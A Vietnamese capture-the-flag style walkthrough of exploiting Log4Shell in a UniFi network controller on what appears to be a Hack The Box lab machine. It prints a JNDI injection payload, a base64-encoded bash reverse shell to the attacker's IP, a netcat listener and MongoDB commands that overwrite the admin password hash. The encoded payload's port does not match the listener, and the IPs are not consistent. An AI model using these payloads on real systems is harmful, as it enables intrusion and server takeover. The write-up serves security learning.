> Target sẽ giúp ta khám phá về lỗ hổng Log4j trong một hệ thống giám sát thiết bị mạng Unify. Chúng ta cũng sẽ được thay đổi thông tin admin nhằm leo thang quyền lực.
### 1. Thu thập thông tin target
###### IP: 10.129.5.75
##### + Kiểm tra kết nối `ping 10.129.5.75`
##### + Kiểm tra cổng và dịch vụ: `nmap -sC -sV -v 10.129.5.75`
###### -v: nói với nmap in thêm thông tin khi quét
##### => 22/tcp : ssh
##### => 6789/tcp : ibm-db2-admin?
##### => 8080/tcp: http-proxy
##### => 8443/tcp: ssl/nagios-nsca: http-title: Unifi Network

### 2. Tìm kiếm thông tin target:
##### + Truy cập địa chỉ 10.129.5.75:8080 sẽ được chuyển hướng sang cổng 8443, được trang web login.
##### + Ngay dưới phần login có phần version của Unifi: `6.4.54`
##### + Kiểm tra version trên mạng với từ khóa `UniFy 6.4.54 exploit` sẽ ra được một [bài báo online](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) nói về lỗ hổng [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) trong ứng dụng này.
##### + Nói thêm một chút về [Log4j](https://www.hackthebox.com/blog/Whats-Going-On-With-Log4j-Exploitation), đây là một lỗ hổng có thể bị khai thác bằng cách đẩy các lệnh hệ điều hành (OS Command Injection), là một lỗ hổng trong an ninh web cho phép attacker triển khai lệnh thực thi hệ điều hành trong server chạy ứng dụng đó và toàn quyền điều khiển ứng dụng và data của nó.

### 3. Khai thác lỗ hổng:
##### + Để kiểm tra và khai thác lỗ hổng, sử dụng BurpSuite để kiểm tra và exploit lỗ hổng đối với trang login:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/0bdf41e6-37c5-499c-85a8-10a6300070fc)
##### + Đầu tiên, thay đổi payload trên trường `remember`: 
##### Có thể đẩy Request trong ảnh vào phần *Repeater* của BurpSuite để kiểm tra nhiều lần:
` “remember” : “${jndi:ldap://10.10.14.26/whatever}” `
###### JNDI(Java Naming and Directory Interface), bằng cách gọi cho API này, ứng dụng	xác định được vị trí của tài nguyên và các đối tượng khác của chương trình.
###### LDAP(Lightweight Directory Access Protocol), một protocol cho ứng dụng tiêu chuẩn 	sử dụng để truy cập và bảo trì các thư mục riêng lẻ qua Internet hoặc Network. Port 	mặc định là port 389.
###### Vì data của POST được gửi đi như JSON và vì payload thường có {} nên để tránh việc nó bị gửi như JSON thì đóng nó bằng “” và sẽ được parse như string.
##### + Foward Request, nhận được thông báo trong phần *Response* rằng payload không hợp lệ, nhưng payload đang được thực thi.
##### + Chạy tcpdump trên port 389 (port mặc định của LDAP) để xem network traffic của LDAP
###### tcp dump  cho phép người dùng xem TCP/IP và các packets được chuyển đi hoặc nhận trong một network.
` sudo tcpdump -i tun0 port 389 `
###### -i: chọn interface (tun0).
##### + Sau khi chạy tcpdump, bấm *Send* trên burpsuite một lần nữa:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/306cee2a-620f-45be-b39a-8002fef2399b)
##### => kết quả tcpdump hiển thị rằng có kết nối đang được nhận trên máy chủ. Chứng tỏ ứng dụng *có lỗ hổng* khi cố gắng kết nối thông qua LDAP port 389.
##### + Cài đặt `Open-JDK` và `Maven` để tạo payload, gửi đến server và chiếm quyền thực thi lệnh từ xa:
```bash
sudo apt update
sudo apt install openjdk-11-jdk -y
java -version
...
sudo apt-get install maven
mvn -v
...
```
###### Open-jDK là kit được sử dụng để build ứng dụng Java. 
###### Maven là một môi trường lập trình (IDE) được sử dụng để tạo project và xử lý thành file `jar`.
##### + Sau khi cài đặt xong, tải và build `Rogue-JNDI`, một ứng dụng khởi động server nội bộ LDAP và cho phép ta nhận kết nối từ server target và thực thi mã độc.
```
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```
##### + Sau khi cài đặt, `RogueJndi-1.1.jar` sẽ được tạo trong thư mục `rogue-jndi/target/`. Giờ chúng ta sẽ cấu hình payload trên để pass vào Rouge-jNDI server:
##### + Đàu tiên, cần mã hóa Base64 payload để tránh các vấn đề về encoding:
```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.14.26/4444 0>&1' | base64
```
###### cổng 4444 là tùy chọn, chọn cổng chưa được sử dụng
###### 10.10.14.26: địa chỉ IP của tun0
###### 0>&1: chuyển input tiêu chuẩn(0) đến output tiêu chuẩn (1).
##### => payload : YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjYvNjc4OSAgMD4mMQo=
##### + Sau khi payload được khởi tạo, bắt đầu app Rogue-JNDI và chuyển payload như một phần của flag --command:
``` 
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo, YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjYvNjc4OSAgMD4mMQo=}|{base64,- d}|{bash,-i}" --hostname "10.10.14.26"
```
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/03b48c36-fb84-4067-9572-8ed6f30683cb)
##### + Giờ server đã lắng nghe trên port 389, mở một cửa sổ terminal khác và bật Netcat để bắt reverse shell: `nc -lvp 4444`
##### + Quay lại với BurpSuite, thay đổi payload thành `${jndi:ldap://10.10.16.24:1389/o=tomcat}` và gửi Request, quan sát kết quả trên terminal của Server Rogue:
```
Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
```
##### + Qua màn hình của nc, có được terminal của Rogue server:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/2ea77fc9-7954-4990-80cd-0c474772c963)
###### nếu nc không nhận, kiểm tra lại cú pháp của khi khởi động java -jar và lúc tạo payload vì dấu cách sai chỗ có thể là nguyên nhân. Trong trường hợp khởi động lại máy ảo, nên tạo lại payload.
###### flag của user nằm trong /home/michael

### 4. Privillege Escalation
##### + Trong bài báo về lổng hổng, có đề cập đến việc chúng ta có thể thâm nhập vào panel admin của `Unify` và trích xuất được SSH sử dung bởi các ứng dụng.
##### + Đầu tiên, kiểm tra xem có MongoDB chạy trên máy target không:
###### MongoDB là một datavase được sử dụng đê lưu trữ các thông tin logging.
`ps aux | grep mongo `
##### => MongoDB chạy trên target ở cổng 27117
##### + Tương tác với MongoDB để tìm kiếm thông tin về amdin. Tìm kiếm trên mạng với từ khóa `Unify Default Database` cho ta thấy tên mặc định cho ứng dụng Unify là `ace`:
` mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" `
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/ffd19c21-5a42-4550-83f5-88cbbac4c4ab)
##### + Pass là mã băm SHA-512 nên sẽ k crack được (nhận điện bằng `$6$`)
##### => Thay đổi mật khẩu cho admin: mật khẩu sẽ là Password1234 và hash nó theo SHA-512:
` mkpasswd -m sha-512 Password1234 `
###### Pass sau khi hash: $6$OArdfxYXGx39iioF$Z4KlxMQG6r95jH/F.v57NYY4wFZIW1GDezQ5YPi9OGRAy1bq56fHA5uDFDSzn9Ylj8xqLkVq/waHMRPj3JyUV0
##### + Thay đổi mật khẩu:
```
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$OArdfxYXGx39iioF$Z4KlxMQG6r95jH/F.v57NYY4wFZIW1GDezQ5YPi9OGRAy1bq56fHA5uDFDSzn9Ylj8xqLkVq/waHMRPj3JyUV0"}})'
...
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```
##### + Nếu `WriteResult` như trên là đã thay đổi pass thành công. Có thể kiếm tra lại với lệnh `mongo --port 27117 ace --eval ‘db.admin.find().forEach(printjson);`
##### + Đăng nhập vào trang login `administrator:Password1234`
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/afc27c72-d6ec-4920-aa4c-9bdba6f7cddf)

##### + Trong phần setting/site có cho phép kết nối SSH với `root:NotACrackablePassword4U2022`
##### + Đăng nhập vào SSH: `ssh root@10.129.5.75` 
##### => Privillege Escalation thành công!
###### flag nằm trong thư mục đăng nhập.

